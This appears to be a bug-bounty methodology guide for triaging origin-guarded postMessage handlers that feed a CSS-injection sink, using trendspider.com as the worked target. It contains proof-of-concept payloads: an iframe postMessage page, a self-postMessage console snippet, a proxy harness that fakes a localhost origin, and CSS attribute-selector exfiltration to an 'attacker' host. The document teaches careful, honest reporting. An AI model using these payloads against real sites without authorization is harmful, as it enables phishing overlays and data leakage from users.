# postMessage handlers that ARE origin-guarded — the CSS-injection finding shape

Most postMessage guidance covers the *missing* origin check (see `hunt-xss` Chain 5). This file
covers the other outcome, which is far more common in mature products: the handler checks
`event.origin` correctly, and still feeds attacker-reachable data into a sink. On a 2026
engagement that was `styleEl.innerText = payload.style.css` — a CSS-injection sink behind a
whitelist.

You need this file for two reasons:
1. so you don't over-report it as XSS, and
2. so you don't under-report it as "guarded, nothing here". It is a real (informational) issue
   with a precise precondition, and the write-up is what makes the difference.

---

## 0. Framability first — CSP `frame-ancestors` can kill the finding before the guard matters

**Read the response headers before you write a single line of PoC.** If the page cannot be
framed by your claimed origin, no `postMessage` can ever reach the handler, and the finding is
dead — regardless of how weak the whitelist is.

```bash
curl -sk -D - -o /dev/null "https://target/widget/?widget_id=x" | grep -iE "frame-ancestors|x-frame-options"
```

Real outcome (trendspider.com, 2026-10):

```
content-security-policy: default-src 'none'; base-uri 'self'; img-src 'self' data:;
  script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self';
  frame-ancestors https://charts.trendspider.com; block-all-mixed-content;
```

`frame-ancestors https://charts.trendspider.com` means **only their own app may frame it**.
Consequences you must state in the write-up:

- The `http://localhost` / `http://chartcalc.local` whitelist entries are **unreachable in
  practice** — the browser refuses the frame before any script runs, so the message listener is
  never even registered. A whitelist entry you cannot frame from is not an attack surface.
- The only delivery path left is an **existing XSS on one of their own whitelisted origins** —
  which is a bigger finding than the CSS injection, and makes this at most a force multiplier.
- Severity drops from "Info with a precondition" to **"defense-in-depth observation, not
  reportable"**. Do not file it.

Verify the block instead of assuming it: load the PoC, screenshot, and confirm the iframe does
not render and the beacon receives **no** request. A refused frame looks like an empty box — that
screenshot is the evidence that the CSP, not your PoC, is the blocker.

Check every path, not just `/` — if any path serves the shell without the header, the finding is
back. `/`, `/index.html`, `/?widget_id=x` and even `/static/js/...` all carried it on this target.

---

## 1. Read the guard before you read the sink

```js
function ir(type, handler, once){
  const fn = o => {
    if(!Je.locations.platforms.includes(o.origin))
      return console.error("Signalstack widget: postMessage event rejected, unknown sender");
    type === o.data?.type && (handler(o.data.payload), once && removeEventListener(type, fn));
  };
  window.addEventListener("message", fn);
}

ir("initial_data_ready", e => {
  const t = e.style;
  if (t) {
    const el = document.createElement("style");
    el.innerText = t.css;                       // sink
    document.head.appendChild(el);
    t.themeId && document.body.classList.add("theme-" + t.themeId);
  }
  ...
}, true);
```

Two things to extract, in this order:

**a) The whitelist values, verbatim.** They are usually built at module load:

```js
Qe = { "charts.trendspider.com":"production", "charts-trading.trendspider.com":"production",
       "d12dp2anpes1mv.cloudfront.net":"staging", "dsq78se9j8jqe.cloudfront.net":"production" }
Ye = ["http://localhost", "http://chartcalc.local", ...Object.keys(Qe).map(h=>"https://"+h)]
```

Now classify each entry:

| Whitelist entry | Attacker-reachable? |
|---|---|
| `https://<their own domains>` | only after an XSS **there** — force multiplier, not standalone |
| `https://<their cloudfront>/<their staging cdn>` | theirs; not yours |
| `http://localhost` | **only port 80.** `http://localhost:8080` produces origin `http://localhost:8080` and is rejected |
| `http://chartcalc.local` | requires a hosts entry, port 80 |

That port-80 detail is the whole severity argument. `includes(o.origin)` is an exact string
compare, so serving your PoC on `:8080` fails and looks like "the bug doesn't reproduce" — it is
reproducing, you are just testing the guard. State this explicitly in the write-up.

**b) What the guard does NOT cover.** The check runs per-message on `o.origin`. A handler that
accepts `"*"` as a target when sending (very common — `parent.postMessage(x, "*")`) is fine; the
receiving side is what matters.

---

## 2. Sink taxonomy for guarded handlers

Work out which of these the handler does, because the impact differs:

| Sink | Impact | Grade |
|---|---|---|
| `eval` / `new Function` / `setTimeout(string)` | full JS execution | High/Critical if any reachable origin |
| `innerHTML` / `insertAdjacentHTML` | HTML → JS | High |
| `location.href = payload.url` | open redirect; `javascript:` only if no scheme check (React Router and most routers reject it) | Low/Info |
| `styleEl.innerText = payload.css` | **CSS injection** — no JS | Info |
| `classList.add("theme-"+payload.themeId)` | class-name injection | Info |
| state field rendered as text | nothing | — |

CSS is not "nothing". It gives you:

- **UI redressing** — hide/overlay real controls, or inject *text* through `::before{content:"…"}`.
  On a trading widget that means a fake banner ("session expired", "verify your broker"),
  which is a phishing surface inside a trusted frame.
- **CSS-only data probing** — `input[value^="A"]{background:url(//attacker/A)}` fires one request
  per matching prefix; repeat per character to exfiltrate values that live in attributes.
- **Layout/theme manipulation** via `--css-vars` and arbitrary `theme-*` classes.

It cannot read `document.cookie`, call APIs, or execute script in any current browser. Say that
plainly in the report — overclaiming kills the credibility of an otherwise valid observation.

---

## 3. PoC construction

Serve from the origin you are claiming, not from `file://` (origin `null`, always rejected).

```html
<iframe id="w" src="https://charts-trading.trendspider.com/?widget_id=poc"></iframe>
<script>
const CSS = `
  body::before{content:"CSS-INJECTED";position:fixed;top:0;left:0;right:0;z-index:2147483647;
    background:#c00;color:#fff;font:bold 15px/1.6 system-ui;text-align:center}
  input[value^="A"]{background-image:url("http://localhost:9000/probe?prefix=A")}
`;
const send = () => document.getElementById("w").contentWindow.postMessage({
  type: "initial_data_ready",
  payload: { style: { css: CSS, themeId: "poc" },
             data: { symbolInfo: { symbol:"AAPL", ticker:"AAPL", description:"Apple Inc." } } }
}, "*");

const f = document.getElementById("w");
f.addEventListener("load", () => { send(); setTimeout(send, 800); setTimeout(send, 2000); });
window.addEventListener("message", e =>
  String(e.data?.type).includes("initial_data_requested") && send());
</script>
```

Timing notes that save a round trip:
- Widgets often send a handshake (`external_widget_<id>__initial_data_requested`) to the parent
  with `"*"` after load. Answer it **and** blind-fire on `load` — the handshake races the iframe
  load event.
- Fire 3× with delays. Handlers registered in `useEffect` are not attached at `load`.
- The `?widget_id=` param is usually required for the handshake to happen at all.

## 3.1 Running it when you have no root — reach origin `http://localhost` without port 80

The precondition is an **origin string**, not a socket. You do not need to bind port 80 if you can
make the browser treat a non-privileged port as `http://localhost`: force loopback traffic through
a local forwarding proxy.

```bash
# one-shot harness: static PoC on :18080, forwarding proxy :18888, beacon listener :19001
python3 scripts/localhost_origin_harness.py --root /path/to/pocdir

google-chrome --headless=new --no-sandbox --disable-gpu --disable-dev-shm-usage \
  --window-size=1200,900 --virtual-time-budget=25000 \
  --proxy-server=http://127.0.0.1:18888 \
  --proxy-bypass-list="<-loopback>" \
  --screenshot=/tmp/poc.png "http://localhost/"
```

Four details decide whether this works — each one cost a round trip:

1. **A PAC file does not override the implicit loopback bypass.** `--proxy-pac-url` with
   `if (host==="localhost") return "PROXY …"` still gets bypassed for loopback; Chrome connects
   direct and you get `ERR_CONNECTION_REFUSED`. Use `--proxy-server` + `--proxy-bypass-list="<-loopback>"`
   (the `<-loopback>` token *subtracts* the built-in bypass).
2. **The proxy must forward by host, not rewrite everything to your static server.** Forward
   absolute-URI requests to their real destination, and special-case only `localhost` → static.
   A blanket rewrite serves your PoC in place of the iframe's own HTML/assets and the widget looks
   broken (grey frame, sad-tab icon) — which reads exactly like "the bug doesn't reproduce".
3. **HTTPS needs `CONNECT` tunnelling.** With a global `--proxy-server`, the `https://` iframe also
   goes through your proxy. Without a CONNECT handler the widget never loads.
4. **`pkill -f <script>.py` can kill your own shell.** The pattern matches the command line of the
   shell that is running the pkill when that same command line also mentions the filename
   (e.g. a preceding `sed -i … <script>.py`). Use `pkill -f "[s]cript.py"` *and* keep the bare
   filename out of the rest of the command, or kill by PID from the process manager.

**Proof-of-execution beacon:** put `body{background-image:url("http://127.0.0.1:19001/css-fired")}`
in the payload CSS. Loopback is a "potentially trustworthy" origin, so the HTTPS widget is *not*
blocked from fetching it by mixed-content rules — and a hit in the listener log is unambiguous
evidence the injected stylesheet went live. No beacon + a blank frame = your delivery path is
closed; check §0 before blaming the payload.

**Control test that proves the guard is real:** serve the identical file on `:8080` without the
proxy. The console prints `postMessage event rejected, unknown sender` and no `<style>` node
appears. Include that negative in the write-up — it is what separates your finding from a claim
that the check is missing.

If you cannot get a whitelisted origin at all, say so and ship the file with the precondition
documented. Do not fake the run, and do not test from `file://` and call it a failure.

---

## 3.2 Proving the sink when framing is blocked — self-postMessage

When §0 kills the delivery path, you still want to know whether the sink is real. The widget page
is almost always **in its own whitelist** (`https://charts-trading.trendspider.com` appears in
`Qe`), so a message the page posts **to itself** passes the origin guard and exercises the real
handler. No iframe, no proxy, no whitelisted origin needed.

Run it in the page's own console (or via CDP `Runtime.evaluate`):

```js
window.postMessage({
  type: "initial_data_ready",
  payload: { style: { css: 'body::before{content:"CSS-INJECTED";position:fixed;top:0;left:0;right:0;background:#c00;color:#fff;z-index:2147483647}', themeId: "poc" },
             data: { symbolInfo: { symbol: "AAPL" } } }
}, "*");
```

Assert on DOM facts, never on the screenshot:

```js
document.querySelectorAll('style').length                    // 1 before → 2 after
document.body.className                                      // "theme-light" → "theme-light theme-poc"
getComputedStyle(document.body, '::before').content          // "\"CSS-INJECTED\""
```

- **Loop it.** Handlers registered in `useEffect` mount after `readyState === "complete"`. A single
  fire at load races the framework and looks like a dead handler. Retry 15 × 400 ms and stop on
  first hit — on the worked target it fired on attempt 2.
- **A blank page is expected.** The widget shell renders no UI without a parent handshake, so the
  screen is empty apart from the `::before` banner. "Page is blank, no domain shown" is not a
  failed run — the DOM assertions are the result.
- **Label it correctly in your notes:** this proves the *sink*, not a vulnerability — you already
  have script execution in that page, which is the precondition. Pair it with §0's refused-frame
  screenshot: sink = proven, delivery = blocked, verdict = defense-in-depth.

This is also the direct answer when the operator says *"I can't reproduce the injection"*: hand
them the retry-loop snippet (or run it via CDP) rather than re-explaining the iframe PoC that the
CSP is designed to stop.

---

## 4. Related observation worth one paragraph: URL-controlled environment

Same config object often carries the environment switch:

```js
Ge = new URLSearchParams(location.search).get("env") || Qe[hostname] || "development"
Je = { env: Ge,
       canUseTokenFromLocalStorage: "local" == Ge,
       locations: { server: "local" == Ge ? "http://localhost:3000/api" : "/1/signalstack/proxy" } }
```

`?env=local` flips the widget's API base to `http://localhost:3000/api` and enables
token-from-localStorage. Not remotely exploitable on its own (the attacker only changes their own
client), but it means a security-relevant base URL is query-controlled and a local process on
3000 can serve the widget's data. Note it; don't inflate it.

---

## 5. Reporting shape for this class

An Info-level CSS injection gets rejected when it reads like a bug report for an XSS. Write it as:

1. **Precondition first** — "requires the attacker to control a page at `http://localhost` (port
   80) or `http://chartcalc.local`, or to already have script execution on one of the product's
   own whitelisted origins."
2. **Mechanism** — the handler code, the whitelist, the sink.
3. **What is achievable** — CSS-only list from §2, with the explicit "no JS execution" line.
4. **Why it still matters** — force multiplier: any future XSS on `charts.trendspider.com` /
   `charts-trading.trendspider.com` escalates instantly into controlled rendering of the trading
   widget, which is the surface that shows positions and order controls.
5. **PoC + control test** — the file, the port requirement, and the `:8080` rejection.
6. **Remediation** — validate `style.css` against a property allowlist, or pass a theme token
   instead of raw CSS; drop `http://localhost` from the production whitelist (keep it in dev
   builds only).

That framing keeps it useful without spending reputational capital on a non-exploitable claim.
